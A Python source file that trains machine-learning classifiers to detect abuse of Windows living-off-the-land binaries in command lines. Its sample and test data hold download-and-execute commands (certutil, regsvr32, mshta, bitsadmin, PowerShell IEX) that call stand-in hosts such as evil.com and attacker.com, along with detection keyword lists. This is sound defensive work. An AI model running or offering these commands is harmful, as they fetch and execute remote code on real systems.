import pandas as pd
import numpy as np
from sklearn.model_selection import train_test_split, cross_val_score, GridSearchCV
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report, confusion_matrix, roc_auc_score
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import StandardScaler
import re
import joblib
import warnings
warnings.filterwarnings('ignore')

class LOLBinsDetector:
    def __init__(self):
        self.model = None
        self.vectorizer = None
        self.feature_names = []
        
    def load_lolbins_dataset(self, file_path):
        """Load LOLBins commands from the dataset file"""
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                commands = [line.strip() for line in file if line.strip()]
            print(f"Loaded {len(commands)} LOLBins commands from dataset")
            return commands
        except FileNotFoundError:
            print(f"Dataset file {file_path} not found. Using sample data.")
            return self.get_sample_lolbins_commands()
    
    def get_sample_lolbins_commands(self):
        """Fallback sample commands if dataset file is not available"""
        return [
            "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.",
            "start ms-appinstaller://?source=https://www.example.org/file.exe",
            "certutil.exe -urlcache -f https://www.example.org/file.exe file.exe",
            "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe",
            "regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://www.example.org/file.ext\")",
            "mshta.exe vbscript:Close(Execute(\"GetObject(\\\"script:https://www.example.org/file.sct\\\")\"))",
            "wmic.exe process call create \"cmd /c c:\\windows\\system32\\calc.exe\"",
            "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1\"",
            "cscript //e:vbscript C:\\Windows\\Temp\\file.ext:script.vbs"
        ]
        
    def extract_features(self, commands):
        """Extract features from command strings"""
        features = []
        
        for cmd in commands:
            feature_dict = {}
            cmd_lower = cmd.lower()
            
            # Basic command features
            feature_dict['command_length'] = len(cmd)
            feature_dict['arg_count'] = len(cmd.split()) - 1
            feature_dict['has_url'] = int(bool(re.search(r'https?://', cmd)))
            feature_dict['has_network_ip'] = int(bool(re.search(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', cmd)))
            feature_dict['has_temp_path'] = int(bool(re.search(r'\\temp\\|\\tmp\\|%temp%', cmd, re.IGNORECASE)))
            feature_dict['has_ads'] = int(bool(re.search(r':\w+\.\w+', cmd)))  # Alternate Data Streams
            feature_dict['has_pipe'] = int('|' in cmd)
            feature_dict['has_redirect'] = int('>' in cmd or '<' in cmd)
            feature_dict['has_ampersand'] = int('&' in cmd)
            
            # Specific LOLBins executables
            lolbins_executables = [
                'calc.exe', 'cmd.exe', 'powershell', 'regsvr32', 'rundll32', 'certutil', 
                'bitsadmin', 'wmic', 'mshta', 'cscript', 'wscript', 'installutil',
                'msbuild', 'csc.exe', 'vbc.exe', 'jsc.exe', 'msxsl', 'regasm',
                'regsvcs', 'aspnet_compiler', 'ieexec', 'msiexec', 'forfiles',
                'pcalua', 'presentationhost', 'replace', 'makecab', 'expand',
                'extrac32', 'findstr', 'esentutl', 'odbcconf', 'netsh', 'acccheckconsole.exe',
                'addinutil.exe', 'adplus.exe', 'advpack.dll', 'agentexecutor.exe',
                'appcert.exe', 'appinstaller.exe', 'appvlp.exe', 'aspnet_compiler.exe',
                'at.exe', 'atbroker.exe', 'bash.exe', 'bginfo.exe', 'bitsadmin.exe',
                'cdb.exe', 'certoc.exe', 'certreq.exe', 'certutil.exe', 'cipher.exe',
                'cl_invocation.ps1', 'cl_loadassembly.ps1', 'cl_mutexverifiers.ps1',
                'cmd.exe', 'cmdkey.exe', 'cmdl32.exe', 'cmstp.exe', 'colorcpl.exe',
                'computerdefaults.exe', 'comsvcs.dll', 'configsecuritypolicy.exe',
                'conhost.exe', 'control.exe', 'coregen.exe', 'createdump.exe',
                'csc.exe', 'cscript.exe', 'csi.exe', 'customshellhost.exe',
                'datasvcutil.exe', 'defaultpack.exe', 'desktopimgdownldr.exe',
                'devicecredentialdeployment.exe', 'devinit.exe', 'devtoolslauncher.exe',
                'devtunnel.exe', 'dfshim.dll', 'dfsvc.exe', 'diantz.exe',
                'diskshadow.exe', 'dnscmd.exe', 'dnx.exe', 'dotnet.exe',
                'dsdbutil.exe', 'dtutil.exe', 'dump64.exe', 'dumpminitool.exe',
                'dxcap.exe', 'ecmangen.exe', 'esentutl.exe', 'eventvwr.exe',
                'excel.exe', 'expand.exe', 'explorer.exe', 'extexport.exe',
                'extrac32.exe', 'findstr.exe', 'finger.exe', 'fltmc.exe',
                'forfiles.exe', 'fsi.exe', 'fsianycpu.exe', 'fsutil.exe',
                'ftp.exe', 'gpscript.exe', 'hh.exe', 'ie4uinit.exe',
                'ieadvpack.dll', 'iediagcmd.exe', 'ieexec.exe', 'ieframe.dll',
                'ilasm.exe', 'imewdbld.exe', 'infdefaultinstall.exe',
                'installutil.exe', 'jsc.exe', 'launch-vsdevshell.ps1',
                'ldifde.exe', 'makecab.exe', 'mavinject.exe', 'mftrace.exe',
                'microsoft.nodejstools.pressanykey.exe', 'microsoft.workflow.compiler.exe',
                'mmc.exe', 'mpcmdrun.exe', 'msaccess.exe', 'msbuild.exe',
                'msconfig.exe', 'msdeploy.exe', 'msdt.exe', 'msedge.exe',
                'msedge_proxy.exe', 'msedgewebview2.exe', 'mshta.exe', 'mshtml.dll',
                'msiexec.exe', 'msohtmed.exe', 'mspub.exe', 'msxsl.exe',
                'netsh.exe', 'ngen.exe', 'ntdsutil.exe', 'odbcconf.exe',
                'offlinescannershell.exe', 'onedrivestandaloneupdater.exe',
                'openconsole.exe', 'pcalua.exe', 'pcwrun.exe', 'pcwutl.dll',
                'pester.bat', 'pktmon.exe', 'pnputil.exe', 'powerpnt.exe',
                'presentationhost.exe', 'print.exe', 'printbrm.exe', 'procdump.exe',
                'protocolhandler.exe', 'provlaunch.exe', 'psr.exe', 'pubprn.vbs',
                'rasautou.exe', 'rcsi.exe', 'rdrleakdiag.exe', 'reg.exe',
                'regasm.exe', 'regedit.exe', 'regini.exe', 'register-cimprovider.exe',
                'regsvcs.exe', 'regsvr32.exe', 'remote.exe', 'replace.exe',
                'rpcping.exe', 'rundll32.exe', 'runexehelper.exe', 'runonce.exe',
                'runscripthelper.exe', 'sc.exe', 'schtasks.exe', 'scriptrunner.exe',
                'scrobj.dll', 'setres.exe', 'settingsynchost.exe', 'setupapi.dll',
                'sftp.exe', 'shdocvw.dll', 'shell32.dll', 'shimgvw.dll',
                'sqldumper.exe', 'sqlps.exe', 'sqltoolsps.exe', 'squirrel.exe',
                'ssh.exe', 'stordiag.exe', 'syncappvpublishingserver.exe',
                'syncappvpublishingserver.vbs', 'syssetup.dll', 'tar.exe',
                'te.exe', 'teams.exe', 'testwindowremoteagent.exe', 'tracker.exe',
                'ttdinject.exe', 'tttracer.exe', 'unregmp2.exe', 'update.exe',
                'url.dll', 'utilityfunctions.ps1', 'vbc.exe', 'verclsid.exe',
                'visio.exe', 'visualuiaverifynative.exe', 'vsdiagnostics.exe',
                'vshadow.exe', 'vsiisexelauncher.exe', 'vsjitdebugger.exe',
                'vslaunchbrowser.exe', 'vsls-agent.exe', 'vstest.console.exe',
                'wab.exe', 'wbadmin.exe', 'wbemtest.exe', 'wfc.exe',
                'wfmformat.exe', 'winfile.exe', 'winget.exe', 'winproj.exe',
                'winrm.vbs', 'winword.exe', 'wlrmdr.exe', 'wmic.exe',
                'workfolders.exe', 'wscript.exe', 'wsl.exe', 'wsreset.exe',
                'wt.exe', 'wuauclt.exe', 'xbootmgrsleep.exe', 'xsd.exe',
                'xwizard.exe', 'zipfldr.dll'

            ]
            
            for executable in lolbins_executables:
                feature_dict[f'has_{executable.replace(".", "_")}'] = int(executable in cmd_lower)
            
            # Suspicious parameters and flags
            feature_dict['has_hidden_window'] = int(any(flag in cmd for flag in ['/s', '-s', '/q', '-q', 'hidden']))
            feature_dict['has_bypass'] = int('bypass' in cmd_lower)
            feature_dict['has_base64'] = int('base64' in cmd_lower)
            feature_dict['has_encoded'] = int(any(word in cmd_lower for word in ['encoded', 'encode']))
            feature_dict['has_download'] = int('download' in cmd_lower)
            feature_dict['has_upload'] = int('upload' in cmd_lower)
            feature_dict['has_export'] = int('export' in cmd_lower)
            feature_dict['has_dump'] = int('dump' in cmd_lower)
            feature_dict['has_inject'] = int('inject' in cmd_lower)
            
            # Script execution indicators
            feature_dict['has_script_protocol'] = int(any(proto in cmd_lower for proto in ['script:', 'javascript:', 'vbscript:']))
            feature_dict['has_remote_path'] = int('\\\\' in cmd)
            feature_dict['has_registry'] = int(any(hive in cmd_lower for hive in ['hklm\\', 'hkcu\\', 'hkey_']))
            
            # Service and task creation
            feature_dict['has_service'] = int('service' in cmd_lower)
            feature_dict['has_task'] = int(any(word in cmd_lower for word in ['schtasks', '/create', 'task']))
            feature_dict['has_privilege'] = int(any(flag in cmd for flag in ['/u', '-u', '/p', '-p']))
            feature_dict['has_quiet'] = int(any(word in cmd_lower for word in ['quiet', '/q', '-q']))
            feature_dict['has_force'] = int(any(word in cmd_lower for word in ['force', '/f', '-f']))
            
            # Suspicious file extensions
            suspicious_extensions = ['scr', 'hta', 'vbs', 'js', 'jar', 'bat', 'cmd', 'ps1', 'exe', 'dll', 'sct', 'msi', 'inf']
            feature_dict['suspicious_extensions'] = len(re.findall(r'\.(?:' + '|'.join(suspicious_extensions) + ')', cmd_lower))
            
            # Network and remote execution indicators
            feature_dict['has_remote_execution'] = int(any(indicator in cmd_lower for indicator in ['/node:', '-computer', 'invoke-command']))
            feature_dict['has_web_request'] = int(any(method in cmd_lower for method in ['webclient', 'webrequest', 'invoke-webrequest']))
            
            # Obfuscation indicators
            feature_dict['has_obfuscation'] = int(any(char in cmd for char in ['^', '`', '~']))
            feature_dict['has_unicode_escape'] = int('\\u' in cmd_lower)
            
            # Count suspicious keywords
            suspicious_keywords = [
                'bypass', 'hidden', 'inject', 'dump', 'backdoor', 'payload', 
                'reverse', 'shell', 'exploit', 'malware', 'trojan', 'stealth',
                'persistence', 'lateral', 'privilege', 'escalation', 'evade'
            ]
            feature_dict['suspicious_keyword_count'] = sum(1 for keyword in suspicious_keywords if keyword in cmd_lower)
            
            # Command complexity indicators
            feature_dict['has_multiple_commands'] = int(cmd.count('&') + cmd.count('|') + cmd.count(';') > 0)
            feature_dict['command_complexity'] = len(re.findall(r'[;&|]', cmd))
            
            features.append(feature_dict)
        
        return pd.DataFrame(features)
    
    def generate_benign_commands(self, count):
        """Generate benign commands for training"""
        benign_templates = [
            "notepad.exe {file}",
            "calc.exe",
            "explorer.exe {path}",
            "cmd.exe /c dir {path}",
            "powershell.exe Get-Process",
            "powershell.exe Get-Service",
            "regedit.exe",
            "msconfig.exe",
            "taskmgr.exe",
            "control.exe",
            "mmc.exe",
            "services.msc",
            "eventvwr.exe",
            "perfmon.exe",
            "resmon.exe",
            "msinfo32.exe",
            "dxdiag.exe",
            "winver.exe",
            "systeminfo.exe",
            "ipconfig.exe /all",
            "ping.exe google.com",
            "nslookup.exe google.com",
            "netstat.exe -an",
            "tasklist.exe",
            "whoami.exe",
            "net.exe user",
            "net.exe share",
            "wmic.exe computersystem get model",
            "reg.exe query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
            "schtasks.exe /query",
            "sc.exe query",
            "diskpart.exe",
            "chkdsk.exe C:",
            "defrag.exe C:",
            "sfc.exe /scannow",
            "dism.exe /online /cleanup-image /restorehealth",
            "powershell.exe Get-EventLog System -Newest 10",
            "powershell.exe Get-WmiObject Win32_ComputerSystem",
            "certutil.exe -store my",
            "bitsadmin /list",
            "regsvr32.exe /u comctl32.dll",
            "rundll32.exe printui.dll,PrintUIEntry /p /n printer",
            "mshta.exe https://microsoft.com",
            "cscript.exe test.vbs",
            "wscript.exe test.js"
        ]
        
        files = ["document.txt", "report.docx", "data.xlsx", "config.ini", "log.txt"]
        paths = ["C:\\Users\\", "C:\\Program Files\\", "D:\\Data\\", "C:\\Windows\\System32\\"]
        
        benign_commands = []
        for i in range(count):
            template = benign_templates[i % len(benign_templates)]
            if '{file}' in template:
                command = template.format(file=files[i % len(files)])
            elif '{path}' in template:
                command = template.format(path=paths[i % len(paths)])
            else:
                command = template
            benign_commands.append(command)
        
        return benign_commands
    
    def prepare_data(self, lolbins_commands):
        """Prepare training data from LOLBins commands"""
        # All LOLBins commands are malicious (label = 1)
        malicious_commands = lolbins_commands
        
        # Generate benign commands (label = 0)
        benign_commands = self.generate_benign_commands(len(malicious_commands))
        
        # Combine datasets
        all_commands = malicious_commands + benign_commands
        labels = [1] * len(malicious_commands) + [0] * len(benign_commands)
        
        print(f"Training data prepared:")
        print(f"  Malicious commands: {len(malicious_commands)}")
        print(f"  Benign commands: {len(benign_commands)}")
        print(f"  Total commands: {len(all_commands)}")
        
        return all_commands, labels
    
    def train(self, dataset_path=None, lolbins_commands=None):
        """Train the detection model"""
        print("=== Starting LOLBins Detection Model Training ===\n")
        
        # Load dataset
        if dataset_path:
            lolbins_commands = self.load_lolbins_dataset(dataset_path)
        elif lolbins_commands is None:
            lolbins_commands = self.get_sample_lolbins_commands()
        
        print("Preparing training data...")
        commands, labels = self.prepare_data(lolbins_commands)
        
        # Extract features
        print("Extracting features...")
        feature_df = self.extract_features(commands)
        print(f"Extracted {len(feature_df.columns)} numerical features")
        
        # Text vectorization for command strings
        print("Creating text features...")
        self.vectorizer = TfidfVectorizer(
            max_features=1000,
            ngram_range=(1, 3),
            analyzer='char_wb',
            lowercase=True,
            min_df=2,
            max_df=0.95
        )
        
        text_features = self.vectorizer.fit_transform(commands)
        print(f"Created {text_features.shape[1]} text features")
        
        # Combine numerical and text features
        numerical_features = feature_df.values
        combined_features = np.hstack([numerical_features, text_features.toarray()])
        print(f"Total feature dimensions: {combined_features.shape[1]}")
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            combined_features, labels, test_size=0.2, random_state=42, stratify=labels
        )
        
        print(f"\nTraining set: {X_train.shape[0]} samples")
        print(f"Test set: {X_test.shape[0]} samples")
        
        print("\nTraining models...")
        
        # Train multiple models and select the best one
        models = {
            'RandomForest': RandomForestClassifier(
                n_estimators=100, 
                random_state=42, 
                n_jobs=-1,
                max_depth=20,
                min_samples_split=5
            ),
            'GradientBoosting': GradientBoostingClassifier(
                n_estimators=100, 
                random_state=42,
                learning_rate=0.1,
                max_depth=6
            ),
            'LogisticRegression': LogisticRegression(
                random_state=42, 
                max_iter=1000,
                C=1.0
            )
        }
        
        best_score = 0
        best_model = None
        best_name = ""
        
        for name, model in models.items():
            print(f"Training {name}...")
            # Cross-validation
            cv_scores = cross_val_score(model, X_train, y_train, cv=5, scoring='roc_auc', n_jobs=-1)
            mean_score = cv_scores.mean()
            
            print(f"  {name} - CV AUC: {mean_score:.4f} (+/- {cv_scores.std() * 2:.4f})")
            
            if mean_score > best_score:
                best_score = mean_score
                best_model = model
                best_name = name
        
        # Train the best model on full training set
        print(f"\nBest model: {best_name} (CV AUC: {best_score:.4f})")
        print("Training final model...")
        self.model = best_model
        self.model.fit(X_train, y_train)
        
        # Evaluate on test set
        print("\nEvaluating model...")
        y_pred = self.model.predict(X_test)
        y_pred_proba = self.model.predict_proba(X_test)[:, 1]
        
        test_auc = roc_auc_score(y_test, y_pred_proba)
        print(f"Test AUC: {test_auc:.4f}")
        
        print("\nClassification Report:")
        print(classification_report(y_test, y_pred))
        
        print("\nConfusion Matrix:")
        cm = confusion_matrix(y_test, y_pred)
        print(cm)
        print(f"True Negatives: {cm[0,0]}, False Positives: {cm[0,1]}")
        print(f"False Negatives: {cm[1,0]}, True Positives: {cm[1,1]}")
        
        # Store feature names for interpretation
        self.feature_names = list(feature_df.columns) + [f'tfidf_{i}' for i in range(text_features.shape[1])]
        
        return self.model
    
    def predict(self, commands):
        """Predict if commands are malicious"""
        if self.model is None:
            raise ValueError("Model not trained yet!")
        
        if isinstance(commands, str):
            commands = [commands]
            
        # Extract features
        feature_df = self.extract_features(commands)
        text_features = self.vectorizer.transform(commands)
        
        # Combine features
        numerical_features = feature_df.values
        combined_features = np.hstack([numerical_features, text_features.toarray()])
        
        # Predict
        predictions = self.model.predict(combined_features)
        probabilities = self.model.predict_proba(combined_features)[:, 1]
        
        return predictions, probabilities
    
    def get_feature_importance(self, top_n=20):
        """Get top important features"""
        if hasattr(self.model, 'feature_importances_'):
            importances = self.model.feature_importances_
            feature_importance = list(zip(self.feature_names, importances))
            feature_importance.sort(key=lambda x: x[1], reverse=True)
            return feature_importance[:top_n]
        return None
    
    def save_model(self, filepath):
        """Save the trained model"""
        model_data = {
            'model': self.model,
            'vectorizer': self.vectorizer,
            'feature_names': self.feature_names
        }
        joblib.dump(model_data, filepath)
        print(f"Model saved to {filepath}")
    
    def load_model(self, filepath):
        """Load a trained model"""
        model_data = joblib.load(filepath)
        self.model = model_data['model']
        self.vectorizer = model_data['vectorizer']
        self.feature_names = model_data['feature_names']
        print(f"Model loaded from {filepath}")

def main():
    """Main function to demonstrate the detector"""
    
    # Initialize the detector
    detector = LOLBinsDetector()
    
    # Train the model with the real dataset
    # Option 1: Train with dataset file path
   # detector.train(dataset_path='lolbin_commands.txt')
    
    # Option 2: Train with commands loaded from your dataset
    # If you have the commands in a list, you can pass them directly:
    with open('lolbin_commands.txt', 'r') as f:
         lolbins_data = [line.strip() for line in f if line.strip()]
    detector.train(lolbins_commands=lolbins_data)
    
    # Show feature importance
    print("\n=== Top Important Features ===")
    feature_importance = detector.get_feature_importance(15)
    if feature_importance:
        for i, (feature, importance) in enumerate(feature_importance, 1):
            print(f"{i:2d}. {feature}: {importance:.4f}")
    
    # Test with new commands
    print("\n=== Testing Detection ===")
    test_commands = [
        # Malicious LOLBins commands
        "certutil.exe -urlcache -f https://malicious.com/payload.exe malware.exe",
        "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')\"",
        "rundll32.exe javascript:alert('test')",
        "regsvr32 /s /u /i:https://evil.com/script.sct scrobj.dll",
        "mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))",
        "bitsadmin /create job1 /addfile job1 https://attacker.com/tool.exe C:\\temp\\tool.exe",
        
        # Benign commands
        "notepad.exe document.txt",
        "calc.exe",
        "powershell.exe Get-Process",
        "certutil.exe -store my",
        "regsvr32.exe /u comctl32.dll",
        "rundll32.exe printui.dll,PrintUIEntry /p"
    ]
    
    predictions, probabilities = detector.predict(test_commands)
    
    print("\nPrediction Results:")
    print("-" * 80)
    for i, cmd in enumerate(test_commands):
        status = "MALICIOUS" if predictions[i] == 1 else "BENIGN"
        confidence = probabilities[i] if predictions[i] == 1 else 1 - probabilities[i]
        
        print(f"Command: {cmd[:70]}{'...' if len(cmd) > 70 else ''}")
        print(f"Prediction: {status} (Confidence: {confidence:.4f})")
        print("-" * 80)
    
    # Save the model
    detector.save_model("lolbins_detector.pkl")
    
    print("\n=== Model Training Complete ===")
    print("The model has been trained on your LOLBins dataset and is ready for use!")
    print("You can now use detector.predict() for real-time detection.")

if __name__ == "__main__":
    main()